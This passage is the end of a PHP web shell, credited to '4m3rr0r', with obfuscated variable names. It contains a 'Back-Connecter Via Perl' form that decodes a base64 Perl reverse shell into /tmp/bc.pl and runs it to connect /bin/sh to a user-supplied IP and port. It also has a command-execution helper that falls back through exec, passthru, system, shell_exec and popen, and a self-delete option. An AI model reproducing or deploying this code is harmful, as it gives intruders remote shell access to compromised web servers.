if (isset($_GET['back_connecter'])) {$_0c5e3246e473="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";echo "<center><br><br>

	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span>Back-Connecter Via Perl</span>
<br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind:
<input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'>
</form><br>";if(isset($_POST['backconnect'])) {function cf($_e0887aa7bc0b,$_9c65822c9127) {$_dfb1f07e894f = @fopen($_e0887aa7bc0b,"w") or @function_exists('file_put_contents');if($_dfb1f07e894f){@fwrite($_dfb1f07e894f,@base64_decode($_9c65822c9127));@fclose($_dfb1f07e894f);}}function An0n3xPloiTeR($_6d1b263a32f3) {$_1765c46dda35 = '';if (function_exists('exec')) {@exec($_6d1b263a32f3,$_1765c46dda35);$_1765c46dda35 = @join("\n",$_1765c46dda35);} elseif (function_exists('passthru')) {ob_start();@passthru($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('system')) {ob_start();@system($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('shell_exec')) {$_1765c46dda35 = shell_exec($_6d1b263a32f3);} elseif (is_resource($_e0887aa7bc0b = @popen($_6d1b263a32f3,"r"))) {$_1765c46dda35 = "";while(!@feof($_e0887aa7bc0b))$_1765c46dda35 .= fread($_e0887aa7bc0b,1024);pclose($_e0887aa7bc0b);}return $_1765c46dda35;}if($_POST['backconnect']) {cf("/tmp/bc.pl",$_0c5e3246e473);$_1765c46dda35 = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); sleep(1);echo "<pre class=ml1>$_1765c46dda35\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>"; unlink("/tmp/bc.pl");}}}?>
		<?php
if (isset($_GET['die'])) {if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {die('<!DOCTYPE html>
<html>
	<head>
		<style>
			
			body{
color:black;			}
		</style>
	</head>
	<body class="body">
		<div class="font">
			<font><br><br>You Deleted Me :3<br>Now Fuck off :V</font>
		</div>
	</body>
</html>'); } ?>
					</span>
				</center>
				<?php
}?>
		</div>
		<div class="footer">
			<font>Developed By 4m3rr0r</a></font>
		</div>
	</body>
</html>


</div>








	<!-- Optional JavaScript; choose one of the two! -->
	 <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
    -->
  </body>
</html>